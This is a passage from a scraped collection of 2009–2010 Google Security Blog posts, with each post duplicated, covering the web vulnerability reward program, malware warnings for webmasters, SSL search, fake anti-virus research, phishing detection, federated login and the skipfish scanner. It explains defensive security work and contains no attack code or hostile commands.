Do not engage in any activity that bombards Google services with large numbers of requests or large volumes of data.   Q) I've found a vulnerability &#8212; how do I report it?  A) Contact details are  listed here . Please only use the email address given for actual vulnerabilities in Google products. Non-security bugs and queries about problems with your account should should instead be directed to the  Google Help Centers .   Q) What reward might I get?  A) The base reward for qualifying bugs is $500. If the rewards panel finds a particular bug to be severe or unusually clever, rewards of up to $3,133.7 may be issued. The panel may also decide a single report actually constitutes multiple bugs requiring reward, or that multiple reports constitute only a single reward.  We understand that some researchers aren&#8217;t interested in the money, so we&#8217;d also like to give you the option to donate your reward to charity. If you do, we'll match it &#8212; subject to our discretion.  Regardless of whether you're rewarded monetarily or not, all vulnerability reporters who interact with us in a respectful, productive manner will be credited on a new vulnerability reporter page. If we file a bug internally, you'll be credited.  Superstar performers will continue to be acknowledged under the \"We Thank You\" section of  this  page.   Q) How do I find out if my bug qualified for a reward?  A) You will receive a comment to this effect in an emailed response from the Google Security Team.   Q) What if someone else also found the same bug ? A) Only the first report of a given issue that we had not yet identified is eligible. In the event of a duplicate submission, only the earliest received report is considered.   Q) Will bugs disclosed without giving Google developers an opportunity to fix them first still qualify?  A)  We believe  handling vulnerabilities responsibly is a two-way street. It's our job to fix serious bugs within a reasonable time frame, and we in turn request advance, private notice of any issues that are uncovered. Vulnerabilities that are disclosed to any party other than Google, except for the purposes of resolving the vulnerability (for example, an issue affecting multiple vendors), will usually not qualify. This includes both full public disclosure and limited private release.   Q) Do I still qualify if I disclose the problem publicly once fixed?  A) Yes, absolutely! We encourage open collaboration. We will also make sure to credit you on our new vulnerability reporter page.   Q) Who determines whether a given bug is eligible?  A) Several members of the Google Security Team including Chris Evans, Neel Mehta, Adam Mein, Matt Moore, and Michal Zalewski.   Q) Are you going to list my name on a public web page?  A) Only if you want us to. If selected as the recipient of a reward, and you accept, we will need your contact details in order to pay you. However, at your discretion, you can choose not to be listed on any credit page.   Q) No doubt you wanted to make some legal points?  A) Sure. We encourage broad participation. However, we are unable to issue rewards to individuals who are on sanctions lists, or who are in countries (e.g. Cuba, Iran, North Korea, Sudan and Syria) on sanctions lists. This program is also not open to minors. You are responsible for any tax implications depending on your country of residency and citizenship. There may be additional restrictions on your ability to enter depending upon your local law.  This is not a competition, but rather an experimental and discretionary rewards program. You should understand that we can cancel the program at any time, and the decision as to whether or not to pay a reward has to be entirely at our discretion.  Of course, your testing must not violate any law, or disrupt or compromise any data that is not your own.  Thank you for helping us to make Google's products more secure. We look forward to issuing our first reward in this new program.                                    Posted by Chris Evans, Neel Mehta, Adam Mein, Matt Moore, and Michal Zalewski; Google Security TeamBack in January of this year, the Chromium open source project launched a well-received vulnerability reward program. In the months since launch, researchers reporting a wide range of great bugs have received rewards — a small summary of which can be found in the Hall of Fame. We've seen a sustained increase in the number of high quality reports from researchers, and their combined efforts are contributing to a more secure Chromium browser for millions of users.Today, we are announcing an experimental new vulnerability reward program that applies to Google web properties. We already enjoy working with an array of researchers to improve Google security, and some individuals who have provided high caliber reports are listed on our credits page. As well as enabling us to thank regular contributors in a new way, we hope our new program will attract new researchers and the types of reports that help make our users safer.In the spirit of the original Chromium blog post, we have some information about the new program in a question and answer format below:Q) What applications are in scope?A) Any Google web properties which display or manage highly sensitive authenticated user data or accounts may be in scope. Some examples could include:*.google.com*.youtube.com*.blogger.com*.orkut.comFor now, Google's client applications (e.g. Android, Picasa, Google Desktop, etc) are not in scope. We may expand the program in the future.UPDATE: We also recommend reading our additional thoughts about these guidelines to help clarify what types of applications and bugs are eligible for this program.Q) What classes of bug are in scope? A) It's difficult to provide a definitive list of vulnerabilities that will be rewarded; however, any serious bug which directly affects the confidentiality or integrity of user data may be in scope. We anticipate most rewards will be in bug categories such as:XSSXSRF / CSRFXSSI (cross-site script inclusion)Bypassing authorization controls (e.g. User A can access User B's private data)Server side code execution or command injectionOut of concern for the availability of our services to all users, we ask you to refrain from using automated testing tools.These categories of bugs are definitively excluded:attacks against Google’s corporate infrastructuresocial engineering and physical attacksdenial of service bugsnon-web application vulnerabilities, including vulnerabilities in client applicationsSEO blackhat techniquesvulnerabilities in Google-branded websites hosted by third partiesbugs in technologies recently acquired by GoogleQ) How far should I go to demonstrate a vulnerability?A) Please, only ever target your own account or a test account. Never attempt to access anyone else's data. Do not engage in any activity that bombards Google services with large numbers of requests or large volumes of data.Q) I've found a vulnerability — how do I report it?A) Contact details are listed here. Please only use the email address given for actual vulnerabilities in Google products. Non-security bugs and queries about problems with your account should should instead be directed to the Google Help Centers.Q) What reward might I get?A) The base reward for qualifying bugs is $500. If the rewards panel finds a particular bug to be severe or unusually clever, rewards of up to $3,133.7 may be issued. The panel may also decide a single report actually constitutes multiple bugs requiring reward, or that multiple reports constitute only a single reward.We understand that some researchers aren’t interested in the money, so we’d also like to give you the option to donate your reward to charity. If you do, we'll match it — subject to our discretion.Regardless of whether you're rewarded monetarily or not, all vulnerability reporters who interact with us in a respectful, productive manner will be credited on a new vulnerability reporter page. If we file a bug internally, you'll be credited.Superstar performers will continue to be acknowledged under the \"We Thank You\" section of this page.Q) How do I find out if my bug qualified for a reward?A) You will receive a comment to this effect in an emailed response from the Google Security Team.Q) What if someone else also found the same bug?A) Only the first report of a given issue that we had not yet identified is eligible. In the event of a duplicate submission, only the earliest received report is considered.Q) Will bugs disclosed without giving Google developers an opportunity to fix them first still qualify?A) We believe handling vulnerabilities responsibly is a two-way street. It's our job to fix serious bugs within a reasonable time frame, and we in turn request advance, private notice of any issues that are uncovered. Vulnerabilities that are disclosed to any party other than Google, except for the purposes of resolving the vulnerability (for example, an issue affecting multiple vendors), will usually not qualify. This includes both full public disclosure and limited private release.Q) Do I still qualify if I disclose the problem publicly once fixed?A) Yes, absolutely! We encourage open collaboration. We will also make sure to credit you on our new vulnerability reporter page.Q) Who determines whether a given bug is eligible?A) Several members of the Google Security Team including Chris Evans, Neel Mehta, Adam Mein, Matt Moore, and Michal Zalewski.Q) Are you going to list my name on a public web page?A) Only if you want us to. If selected as the recipient of a reward, and you accept, we will need your contact details in order to pay you. However, at your discretion, you can choose not to be listed on any credit page.Q) No doubt you wanted to make some legal points?A) Sure. We encourage broad participation. However, we are unable to issue rewards to individuals who are on sanctions lists, or who are in countries (e.g. Cuba, Iran, North Korea, Sudan and Syria) on sanctions lists. This program is also not open to minors. You are responsible for any tax implications depending on your country of residency and citizenship. There may be additional restrictions on your ability to enter depending upon your local law.This is not a competition, but rather an experimental and discretionary rewards program. You should understand that we can cancel the program at any time, and the decision as to whether or not to pay a reward has to be entirely at our discretion.Of course, your testing must not violate any law, or disrupt or compromise any data that is not your own.Thank you for helping us to make Google's products more secure. We look forward to issuing our first reward in this new program.     ", "date": "November 1, 2010"},
{"website": "Google-Security", "title": "\nMore Information about Malware Details\n", "author": ["Posted by: Lucas Ballard, Anti-Malware Team"], "link": "https://security.googleblog.com/2009/11/more-information-about-malware-details.html", "abstract": "                             Posted by: Lucas Ballard, Anti-Malware Team   A month ago we announced the release of a new  Webmaster Tools feature  that helps webmasters identify malicious content that has been surreptitiously added to their sites. We've been working on improving the quality of the feature since it launched, and yesterday we released some changes that should make the information even more useful. Most of the changes have occurred behind the scenes, but the end result is that we can provide more data, with higher accuracy, and do so more quickly. If your site is receiving a malware warning for Google search results, please visit  Webmaster Tools  for more details about the problematic code that our automated systems have discovered.  We will continue to improve the feature over time and welcome feedback via comments on this blogpost. If you are a webmaster of a compromised site and use the feature to help clean your site, please include feedback in the comment field of the  appeal request .                                   Posted by: Lucas Ballard, Anti-Malware TeamA month ago we announced the release of a new Webmaster Tools feature that helps webmasters identify malicious content that has been surreptitiously added to their sites. We've been working on improving the quality of the feature since it launched, and yesterday we released some changes that should make the information even more useful. Most of the changes have occurred behind the scenes, but the end result is that we can provide more data, with higher accuracy, and do so more quickly. If your site is receiving a malware warning for Google search results, please visit Webmaster Tools for more details about the problematic code that our automated systems have discovered.We will continue to improve the feature over time and welcome feedback via comments on this blogpost. If you are a webmaster of a compromised site and use the feature to help clean your site, please include feedback in the comment field of the appeal request.     ", "date": "November 24, 2009"},
{"website": "Google-Security", "title": "\nExtending SSL to Google search\n", "author": ["Posted by Murali Viswanathan, Product Manager"], "link": "https://security.googleblog.com/2010/05/extending-ssl-to-google-search.html", "abstract": "                             Posted by Murali Viswanathan, Product Manager   Google understands the potential risks of browsing the web on an unsecured network, particularly when information is sent over the wire unencrypted &#8212; as it is for most major websites today. That&#8217;s why we offered SSL support for Gmail back when we launched the product in 2004. Most other webmail providers don&#8217;t provide this feature even today. We&#8217;ve since added SSL support for Calendar, Docs, Sites, and several other products. Additionally, early this year we made SSL the  default setting  for all Gmail users.  As we work to provide more support for SSL across our products, today we&#8217;re introducing the ability to search with Google over SSL. We still have some testing to do, but you can try out the new encrypted version of Google search at  https://www.google.com  and read more about it on the  Official Google Blog .                                   Posted by Murali Viswanathan, Product ManagerGoogle understands the potential risks of browsing the web on an unsecured network, particularly when information is sent over the wire unencrypted — as it is for most major websites today. That’s why we offered SSL support for Gmail back when we launched the product in 2004. Most other webmail providers don’t provide this feature even today. We’ve since added SSL support for Calendar, Docs, Sites, and several other products. Additionally, early this year we made SSL the default setting for all Gmail users.As we work to provide more support for SSL across our products, today we’re introducing the ability to search with Google over SSL. We still have some testing to do, but you can try out the new encrypted version of Google search at https://www.google.com and read more about it on the Official Google Blog.     ", "date": "May 21, 2010"},
{"website": "Google-Security", "title": "\nThe Rise of Fake Anti-Virus\n", "author": ["Posted by Niels Provos, Security Team"], "link": "https://security.googleblog.com/2010/04/rise-of-fake-anti-virus.html", "abstract": "                             Posted by Niels Provos, Security Team  For years, we have detected malicious content on the web and helped protect users from it. Vulnerabilities in web browsers and popular plugins have resulted in an increased number of users whose systems can be compromised by attacks known as drive-by downloads. Such attacks do not require any user interaction, and they allow the adversary to execute code on a user&#8217;s computer without their knowledge. However, even without any vulnerabilities present, clever social engineering attacks can cause an unsuspecting user to unwittingly install malicious code supplied by an attacker on their computer.  One increasingly prevalent threat is the spread of Fake Anti-Virus (Fake AV) products. This malicious software takes advantage of users&#8217; fear that their computer is vulnerable, as well as their desire to take the proper corrective action. Visiting a malicious or compromised web site &#8212; or sometimes even viewing a malicious ad &#8212; can produce a screen looking something like the following:          At Google, we have been working to help protect users against Fake AV threats on the web since we first discovered them in March 2007. In addition to protections like adding warnings to browsers and search results, we&#8217;re also actively engaged in malware research. We conducted an in-depth analysis of the prevalence of Fake AV over the course of the last 13 months, and the research paper containing our findings, &#8220; The Nocebo Effect on the Web: An Analysis of Fake AV distribution &#8221; is going to be presented at the  Workshop on Large-Scale Exploits and Emergent Threats  (LEET) in San Jose, CA on April 27th. While we do not want to spoil any surprises, here are a few previews. Our analysis of 240 million web pages over the 13 months of our study uncovered over 11,000 domains involved in Fake AV distribution &#8212; or, roughly 15% of the malware domains we detected on the web during that period.  Also, over the last year, the lifespan of domains distributing Fake AV attacks has decreased significantly:      In the meantime, we recommend only running antivirus and antispyware products from  trusted companies . Be sure to use the latest versions of this software, and if the scan detects any suspicious programs or applications, remove them immediately.                                   Posted by Niels Provos, Security TeamFor years, we have detected malicious content on the web and helped protect users from it. Vulnerabilities in web browsers and popular plugins have resulted in an increased number of users whose systems can be compromised by attacks known as drive-by downloads. Such attacks do not require any user interaction, and they allow the adversary to execute code on a user’s computer without their knowledge. However, even without any vulnerabilities present, clever social engineering attacks can cause an unsuspecting user to unwittingly install malicious code supplied by an attacker on their computer.One increasingly prevalent threat is the spread of Fake Anti-Virus (Fake AV) products. This malicious software takes advantage of users’ fear that their computer is vulnerable, as well as their desire to take the proper corrective action. Visiting a malicious or compromised web site — or sometimes even viewing a malicious ad — can produce a screen looking something like the following:At Google, we have been working to help protect users against Fake AV threats on the web since we first discovered them in March 2007. In addition to protections like adding warnings to browsers and search results, we’re also actively engaged in malware research. We conducted an in-depth analysis of the prevalence of Fake AV over the course of the last 13 months, and the research paper containing our findings, “The Nocebo Effect on the Web: An Analysis of Fake AV distribution” is going to be presented at the Workshop on Large-Scale Exploits and Emergent Threats (LEET) in San Jose, CA on April 27th. While we do not want to spoil any surprises, here are a few previews. Our analysis of 240 million web pages over the 13 months of our study uncovered over 11,000 domains involved in Fake AV distribution — or, roughly 15% of the malware domains we detected on the web during that period.Also, over the last year, the lifespan of domains distributing Fake AV attacks has decreased significantly:In the meantime, we recommend only running antivirus and antispyware products from trusted companies. Be sure to use the latest versions of this software, and if the scan detects any suspicious programs or applications, remove them immediately.     ", "date": "April 14, 2010"},
{"website": "Google-Security", "title": "\nDo machines dream of electric malware?\n", "author": ["Posted by: Oliver Fisher, Anti-Malware Team"], "link": "https://security.googleblog.com/2009/10/do-machines-dream-of-electric-malware.html", "abstract": "                             Posted by: Oliver Fisher, Anti-Malware Team   We've explored Google's  anti-malware processes  several times recently, as well as our efforts to work with webmasters to help protect their users. However, there's been some confusion about the objectivity of our scanning and flagging procedures.  Google uses fully automated systems to scan the Internet for potentially dangerous sites. These systems help detect sites infected with malware and then add a warning that appears in Google search results and in many web browsers. We flag sites in this way to help protect users who might visit them. The warning is a cautionary page, and we never prevent users from viewing the affected site if they choose. It's important to note that sites are often compromised without the webmaster's knowledge, so we provide affected webmasters with further information on the issues we've identified &#8212; including  showing snippets of the malicious code we find . We also offer free resources in Google  Webmaster Tools  to help site owners clean their sites and request a re-scan.  Site owners sometimes say that we've made a mistake and that their site does not contain malware. For example, the recent appearance of a malware warning on people.com.cn sparked discussion about how Google flags websites. Our scanners &#8212; which are automated and indifferent to a site's subject matter &#8212; first found a malicious ad on the book.people.com.cn domain at approximately 3:47 a.m. PT on October 17, 2009. Over several days, the scanners detected thousands of URLs with suspicious content in other people.com.cn domains.  Malicious content can be very difficult to detect. A previous post on this blog offered  tips for finding hidden malware and cleaning up websites . There are also good tips on Google's  Webmaster Central Blog . If a webmaster has indeed removed the malicious content and filed a malware review request in  Webmaster Tools , the warning label will be removed shortly. If it persists, however, it's very likely that dangerous content remains. Our scanners are highly accurate, and false positives are extremely rare.  When Google's automated systems detect dangerous content on a site, an email is sent to  several administrative email addresses  at the site, as well as to the corresponding  Webmaster Tools  account if one exists. We sent a notification to people.com.cn at 11:01 a.m. PT on October 17, just as any compromised site would receive. The email includes an explanation of how the site may have become compromised and unknowingly been distributing malware. It also describes the process of removing malware from the site and getting the Google warning removed from the site. A copy of the message sent to the addresses associated with infected sites is below:    We recently discovered that some of your pages can cause users to be infected with malicious software. We have begun showing a warning page to users who visit these pages by clicking a search result on Google.com. ... We strongly encourage you to investigate this immediately to protect your visitors. Although some sites intentionally distribute malicious software, in many cases the webmaster is unaware because: 1) the site was compromised 2) the site doesn't monitor for malicious user-contributed content 3) the site displays content from an ad network that has a malicious advertiser  If your site was compromised, it's important to not only remove the malicious (and usually hidden) content from your pages, but to also identify and fix the vulnerability. We suggest contacting your hosting provider if you are unsure of how to proceed. StopBadware also has a resource page for securing compromised sites:  http://www.stopbadware.org/home/security  Once you've secured your site, you can request that the warning be removed by visiting  http://www.google.com/support/webmasters/bin/answer.py?answer=45432  and requesting a review. If your site is no longer harmful to users, we will remove the warning.    As the email says, the fastest way for a site to be removed from the malware list is for the webmaster to file a review request via Google  Webmaster Tools . Google's automated scanners will periodically re-examine the site even if no such request is received, but the process will take longer. People.com.cn did not file a review request, but our scanners reviewed the site on October 23 and removed the malware warning after finding that the malicious ad was gone.  Malicious display ads are an increasingly common way for sites to unknowingly distribute malware. We recently wrote about the steps that Google takes to help  protect our advertising networks . Also, other publishers have recently written about  their experiences with deceptive display ads .                                   Posted by: Oliver Fisher, Anti-Malware TeamWe've explored Google's anti-malware processes several times recently, as well as our efforts to work with webmasters to help protect their users. However, there's been some confusion about the objectivity of our scanning and flagging procedures.Google uses fully automated systems to scan the Internet for potentially dangerous sites. These systems help detect sites infected with malware and then add a warning that appears in Google search results and in many web browsers. We flag sites in this way to help protect users who might visit them. The warning is a cautionary page, and we never prevent users from viewing the affected site if they choose. It's important to note that sites are often compromised without the webmaster's knowledge, so we provide affected webmasters with further information on the issues we've identified — including showing snippets of the malicious code we find. We also offer free resources in Google Webmaster Tools to help site owners clean their sites and request a re-scan.Site owners sometimes say that we've made a mistake and that their site does not contain malware. For example, the recent appearance of a malware warning on people.com.cn sparked discussion about how Google flags websites. Our scanners — which are automated and indifferent to a site's subject matter — first found a malicious ad on the book.people.com.cn domain at approximately 3:47 a.m. PT on October 17, 2009. Over several days, the scanners detected thousands of URLs with suspicious content in other people.com.cn domains.Malicious content can be very difficult to detect. A previous post on this blog offered tips for finding hidden malware and cleaning up websites. There are also good tips on Google's Webmaster Central Blog. If a webmaster has indeed removed the malicious content and filed a malware review request in Webmaster Tools, the warning label will be removed shortly. If it persists, however, it's very likely that dangerous content remains. Our scanners are highly accurate, and false positives are extremely rare.When Google's automated systems detect dangerous content on a site, an email is sent to several administrative email addresses at the site, as well as to the corresponding Webmaster Tools account if one exists. We sent a notification to people.com.cn at 11:01 a.m. PT on October 17, just as any compromised site would receive. The email includes an explanation of how the site may have become compromised and unknowingly been distributing malware. It also describes the process of removing malware from the site and getting the Google warning removed from the site. A copy of the message sent to the addresses associated with infected sites is below:We recently discovered that some of your pages can cause users to be infected with malicious software. We have begun showing a warning page to users who visit these pages by clicking a search result on Google.com....We strongly encourage you to investigate this immediately to protect your visitors. Although some sites intentionally distribute malicious software, in many cases the webmaster is unaware because:1) the site was compromised2) the site doesn't monitor for malicious user-contributed content3) the site displays content from an ad network that has a malicious advertiserIf your site was compromised, it's important to not only remove the malicious (and usually hidden) content from your pages, but to also identify and fix the vulnerability. We suggest contacting your hosting provider if you are unsure of how to proceed. StopBadware also has a resource page for securing compromised sites: http://www.stopbadware.org/home/security Once you've secured your site, you can request that the warning be removed by visiting http://www.google.com/support/webmasters/bin/answer.py?answer=45432 and requesting a review. If your site is no longer harmful to users, we will remove the warning.As the email says, the fastest way for a site to be removed from the malware list is for the webmaster to file a review request via Google Webmaster Tools. Google's automated scanners will periodically re-examine the site even if no such request is received, but the process will take longer. People.com.cn did not file a review request, but our scanners reviewed the site on October 23 and removed the malware warning after finding that the malicious ad was gone.Malicious display ads are an increasingly common way for sites to unknowingly distribute malware. We recently wrote about the steps that Google takes to help protect our advertising networks. Also, other publishers have recently written about their experiences with deceptive display ads.     ", "date": "October 29, 2009"},
{"website": "Google-Security", "title": "\nPhishing phree\n", "author": ["Posted by Colin Whittaker, Anti-Phishing Team "], "link": "https://security.googleblog.com/2010/03/phishing-phree.html", "abstract": "                             Posted by Colin Whittaker, Anti-Phishing Team    To help protect you from a wide array of Internet scams you may encounter while searching, we analyze millions of webpages daily for  phishing  behavior. Each year, we find hundreds of thousands of phishing pages and add them to our list that we use to directly warn users of Firefox, Safari, and Chrome via our  SafeBrowsing API . How do we find all these phishing pages? We certainly don&#8217;t do it by hand!  Instead, we have taught computers to look for certain telltale signs, as we describe in a  paper  that we recently presented at the  17th Annual Network and Distributed System Security Symposium . In a nutshell, our system looks at many of the same elements of a webpage that you would check to help evaluate whether the page is designed for phishing. If our system determines that a page is being used for phishing, it will automatically produce a warning for all of our users who try to visit that page. This scalable design enables us to review all these potentially &#8220;phishy&#8221; pages in about a minute each.   What we look for           Our system analyzes a number of webpage features to help make a verdict about whether a site is a phishing site. Starting with a page&#8217;s URL, we look to see if there is anything unusual about the host, such as whether the hostname is unusually long or whether the URL uses an IP address to specify the host. We also look to see if the URL contains any phrases like &#8220;banking&#8221; or &#8220;login&#8221; that might indicate that the page is trying to steal information.  We don&#8217;t just look at the URL, though. After all, a perfectly legitimate site could certainly use words like &#8220;banking&#8221; or &#8220;login.&#8221; We collect a snapshot of the page&#8217;s content to examine it closely for phishing behavior. For example, we check to see if the page has a password field or whether most of the links point to a common phishing target, as both of these characteristics can be a sign of phishing. Additionally, we pick out some of the most characteristic terms that show up on a page (as defined by their  TF-IDF  scores), and look for terms like &#8220;password&#8221; or &#8220;PIN number,&#8221; which also may indicate that the page is intended for phishing.  We also check the page&#8217;s hosting information to find out which networks host the page and where the page&#8217;s servers are located geographically. If a site purporting to be an American bank runs its servers in a different country and is hosted on a local residential ISP&#8217;s network, we have a strong signal that the site is bad.  Finally, we check the page&#8217;s  PageRank  to see if the page is popular or not, and we check the spam reputation of the page&#8217;s domain. We discovered in our research findings that almost all phishing pages are found on domains that almost exclusively send spam. You can observe this trend in the  CCDF  graph of the spam reputation scores for phishing pages as compared to the graph of other, non-phishing pages.       How we learn to recognize phishing pages        We use a sample of the data that our system generates to train the classifier that lies at the core of our automatic system using a machine learning algorithm. Coming up with good labels (phishing/not phishing) for this data is tricky because we can&#8217;t label each of the millions of pages ourselves. Instead, we use our published phishing page list, largely generated by our classifier, to assign labels for the training data.  You might be wondering if this system is going to lead to situations where the classifier makes a mistake, puts that mistake on our list, and then uses the list to learn to make more mistakes. Fortunately, the chain doesn&#8217;t make it that far. Our classifier only makes a relatively small number of mistakes, which we can correct manually when you  report them to us . Our learning algorithms can handle a few temporary errors in the training labels, and the overall learning process remains stable.   How well does this work?   Of the millions of webpages that our scanners analyze for phishing, we successfully identify 9 out of 10 phishing pages. Our classification system only incorrectly flags a non-phishing site as a phishing site about 1 in 10,000 times, which is significantly better than similar systems. In our experience, these &#8220;false positive&#8221; sites are usually built to distribute spam or may be involved with other suspicious activity. While phishers are constantly changing their strategies, we find that they do not change them enough to reliably escape our system. Our experiments showed that our classification system remained effective for over a month without retraining.  If you are a webmaster and would like more information about how to keep your site from looking like a phishing site, please check out our  post  on the  Webmaster Central Blog . If you find that your site has been added to our phishing page list (\"Reported Web Forgery!\") by mistake, please  report  the error to us.                                     Posted by Colin Whittaker, Anti-Phishing Team To help protect you from a wide array of Internet scams you may encounter while searching, we analyze millions of webpages daily for phishing behavior. Each year, we find hundreds of thousands of phishing pages and add them to our list that we use to directly warn users of Firefox, Safari, and Chrome via our SafeBrowsing API. How do we find all these phishing pages? We certainly don’t do it by hand!Instead, we have taught computers to look for certain telltale signs, as we describe in a paper that we recently presented at the 17th Annual Network and Distributed System Security Symposium. In a nutshell, our system looks at many of the same elements of a webpage that you would check to help evaluate whether the page is designed for phishing. If our system determines that a page is being used for phishing, it will automatically produce a warning for all of our users who try to visit that page. This scalable design enables us to review all these potentially “phishy” pages in about a minute each.What we look forOur system analyzes a number of webpage features to help make a verdict about whether a site is a phishing site. Starting with a page’s URL, we look to see if there is anything unusual about the host, such as whether the hostname is unusually long or whether the URL uses an IP address to specify the host. We also look to see if the URL contains any phrases like “banking” or “login” that might indicate that the page is trying to steal information.We don’t just look at the URL, though. After all, a perfectly legitimate site could certainly use words like “banking” or “login.” We collect a snapshot of the page’s content to examine it closely for phishing behavior. For example, we check to see if the page has a password field or whether most of the links point to a common phishing target, as both of these characteristics can be a sign of phishing. Additionally, we pick out some of the most characteristic terms that show up on a page (as defined by their TF-IDF scores), and look for terms like “password” or “PIN number,” which also may indicate that the page is intended for phishing.We also check the page’s hosting information to find out which networks host the page and where the page’s servers are located geographically. If a site purporting to be an American bank runs its servers in a different country and is hosted on a local residential ISP’s network, we have a strong signal that the site is bad.Finally, we check the page’s PageRank to see if the page is popular or not, and we check the spam reputation of the page’s domain. We discovered in our research findings that almost all phishing pages are found on domains that almost exclusively send spam. You can observe this trend in the CCDF graph of the spam reputation scores for phishing pages as compared to the graph of other, non-phishing pages.How we learn to recognize phishing pagesWe use a sample of the data that our system generates to train the classifier that lies at the core of our automatic system using a machine learning algorithm. Coming up with good labels (phishing/not phishing) for this data is tricky because we can’t label each of the millions of pages ourselves. Instead, we use our published phishing page list, largely generated by our classifier, to assign labels for the training data.You might be wondering if this system is going to lead to situations where the classifier makes a mistake, puts that mistake on our list, and then uses the list to learn to make more mistakes. Fortunately, the chain doesn’t make it that far. Our classifier only makes a relatively small number of mistakes, which we can correct manually when you report them to us. Our learning algorithms can handle a few temporary errors in the training labels, and the overall learning process remains stable.How well does this work?Of the millions of webpages that our scanners analyze for phishing, we successfully identify 9 out of 10 phishing pages. Our classification system only incorrectly flags a non-phishing site as a phishing site about 1 in 10,000 times, which is significantly better than similar systems. In our experience, these “false positive” sites are usually built to distribute spam or may be involved with other suspicious activity. While phishers are constantly changing their strategies, we find that they do not change them enough to reliably escape our system. Our experiments showed that our classification system remained effective for over a month without retraining.If you are a webmaster and would like more information about how to keep your site from looking like a phishing site, please check out our post on the Webmaster Central Blog. If you find that your site has been added to our phishing page list (\"Reported Web Forgery!\") by mistake, please report the error to us.      ", "date": "March 30, 2010"},
{"website": "Google-Security", "title": "\nFederal Support for Federated Login\n", "author": ["Posted by Eric Sachs, Senior Product Manager, Google Security"], "link": "https://security.googleblog.com/2010/03/federal-support-for-federated-login.html", "abstract": "                             Posted by Eric Sachs, Senior Product Manager, Google Security   Last November, we  discussed the progress  that account login systems operating via standards-based identity technologies like  OpenID  have achieved across the web. As more websites seek to interact with one another to provide a richer experience for users, we're seeing even more interest in finding a secure way to enable that kind of information sharing while avoiding the hassle for users of creating new accounts and passwords.  Excitement for technology like OpenID is not limited to the private sector. President Obama's open government memorandum last year spurred the  creation of a pilot initiative  in September to enable U.S. citizens to more easily sign in to government-run websites. Google joined a number of other companies to explore ways to answer that call.  Now, several months later, some interesting things are taking shape. The  Open Identity Exchange (OIX) , a new organization and certification body focused on online identity management,  today named  Google among the first identity providers to be approved by the U.S. Government as meeting federal standards for identity assurance. This means that Google's identity, security, and privacy specifications have been certified so that a user can register and log in at U.S. government websites using their Google account login credentials. The National Institute of Health (NIH) is the first government website  ready to accept  such credentials, and we look forward to seeing other websites open up to certified identity providers so that users will have an easier and more secure time interacting with these resources.  Our hope is that the work of the OIX and other groups will continue to grow and help facilitate more open government participation, as well as improve security on the Internet by reducing password use across websites.                                   Posted by Eric Sachs, Senior Product Manager, Google SecurityLast November, we discussed the progress that account login systems operating via standards-based identity technologies like OpenID have achieved across the web. As more websites seek to interact with one another to provide a richer experience for users, we're seeing even more interest in finding a secure way to enable that kind of information sharing while avoiding the hassle for users of creating new accounts and passwords.Excitement for technology like OpenID is not limited to the private sector. President Obama's open government memorandum last year spurred the creation of a pilot initiative in September to enable U.S. citizens to more easily sign in to government-run websites. Google joined a number of other companies to explore ways to answer that call.Now, several months later, some interesting things are taking shape. The Open Identity Exchange (OIX), a new organization and certification body focused on online identity management, today named Google among the first identity providers to be approved by the U.S. Government as meeting federal standards for identity assurance. This means that Google's identity, security, and privacy specifications have been certified so that a user can register and log in at U.S. government websites using their Google account login credentials. The National Institute of Health (NIH) is the first government website ready to accept such credentials, and we look forward to seeing other websites open up to certified identity providers so that users will have an easier and more secure time interacting with these resources.Our hope is that the work of the OIX and other groups will continue to grow and help facilitate more open government participation, as well as improve security on the Internet by reducing password use across websites.     ", "date": "March 3, 2010"},
{"website": "Google-Security", "title": "\nMeet skipfish, our automated web security scanner\n", "author": ["Posted by Michal Zalewski"], "link": "https://security.googleblog.com/2010/03/meet-skipfish-our-automated-web.html", "abstract": "                             Posted by Michal Zalewski     The safety of the Internet is of paramount importance to Google, and helping web developers build secure, reliable web applications is an important part of the equation. To advance this goal, we have released projects such as  ratproxy , a passive security assessment tool; and  Browser Security Handbook , a comprehensive guide for web developers. We also worked with the community to  improve the security of third-party browsers .    Today, we are happy to announce the availability of   skipfish   - our free, open source, fully automated, active web application security reconnaissance tool. We think this project is interesting for a few reasons:     High speed : written in pure C, with highly optimized HTTP handling and a minimal CPU footprint, the tool easily achieves 2000 requests per second with responsive targets.       Ease of use : the tool features heuristics to support a variety of quirky web frameworks and mixed-technology sites, with automatic learning capabilities, on-the-fly wordlist creation, and form autocompletion.       Cutting-edge security logic : we incorporated high quality, low false positive, differential security checks capable of spotting a range of subtle flaws, including blind injection vectors.    As with  ratproxy , we feel that  skipfish  will be a valuable contribution to the information security community, making security assessments significantly more accessible and easier to execute.    To download the scanner, please visit  this page ; detailed project documentation is  available here .                                   Posted by Michal Zalewski  The safety of the Internet is of paramount importance to Google, and helping web developers build secure, reliable web applications is an important part of the equation. To advance this goal, we have released projects such as ratproxy, a passive security assessment tool; and Browser Security Handbook, a comprehensive guide for web developers. We also worked with the community to improve the security of third-party browsers.  Today, we are happy to announce the availability of skipfish - our free, open source, fully automated, active web application security reconnaissance tool. We think this project is interesting for a few reasons: High speed: written in pure C, with highly optimized HTTP handling and a minimal CPU footprint, the tool easily achieves 2000 requests per second with responsive targets.  Ease of use: the tool features heuristics to support a variety of quirky web frameworks and mixed-technology sites, with automatic learning capabilities, on-the-fly wordlist creation, and form autocompletion.  Cutting-edge security logic: we incorporated high quality, low false positive, differential security checks capable of spotting a range of subtle flaws, including blind injection vectors. As with ratproxy, we feel that skipfish will be a valuable contribution to the information security community, making security assessments significantly more accessible and easier to execute.  To download the scanner, please visit this page; detailed project documentation is available here.     ", "date": "March 19, 2010"},
{"website": "Google-Security", "title": "\nProtecting Users and Ads from Malware\n", "author": ["Posted by Eric Davis, Head of Anti-Malvertising"], "link": "https://security.googleblog.com/2009/10/protecting-users-and-ads-from-malware.html", "abstract": "                             Posted by Eric Davis, Head of Anti-Malvertising   As part of Cyber Security Awareness Month, we're highlighting cyber security tips and features to help ensure you're taking the necessary steps to protect your computer, website, and personal information. For general cyber security tips, check out  our online security educational series  or visit  http://www.staysafeonline.org/ .  At Google, we always aim to provide users with useful, relevant information. Readers of this blog know that we also work hard to detect malicious content on the web and protect users from harm. But did you know that we strive for the same level of relevance, and work equally as hard to protect users, in our online advertising business?  The mainstream media has recently picked up on the topic of malvertising (malware-infected advertising). Google's Anti-Malvertising Team works hard in this area and would like to take this time to share some important safety tips. We work closely with the Anti-Malware Team to identify trends and improve automated detection systems. We also educate users, develop policies and act as a liaison between the online security and online advertising communities.  Whether you're a web publisher who accepts ads on your website, or a home user who enjoys browsing the wide variety of advertising-supported content available on the web, we expect the resources below will help protect you from 